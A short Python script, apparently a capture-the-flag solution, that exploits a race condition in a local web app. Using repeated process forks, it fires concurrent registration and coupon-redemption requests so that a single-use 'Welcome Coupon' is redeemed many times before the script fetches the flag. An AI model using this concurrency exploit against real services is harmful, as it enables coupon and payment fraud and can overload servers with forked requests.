import os
import requests
import re

url = "http://localhost:5000"

userid = os.urandom(8).hex()
password = os.urandom(8).hex()

a = os.fork()
b = os.fork()
c = os.fork()
d = os.fork()
e = os.fork()

requests.post(url + "/register", data={"userid": userid, "password": password})

if a == 0 or b == 0 or c == 0 or d == 0 or e == 0:
    exit()

s = requests.Session()
s.post(url + "/login", data={"userid": userid, "password": password})
session = s.cookies['session']
coupons = requests.get(url + "/coupons", cookies={'session': session}).text
coupons = re.findall(r'<td><a href="/coupons/(.*?)">Welcome Coupon', coupons)

for coupon in coupons:
    a = os.fork()
    b = os.fork()
    c = os.fork()
    d = os.fork()
    e = os.fork()
    requests.get(url + f"/coupons/{coupon}", cookies={'session': session})
    if a == 0 or b == 0 or c == 0 or d == 0 or e == 0:
        exit()

flag = requests.get(url + "/flag", cookies={'session': session}).text
print(flag)
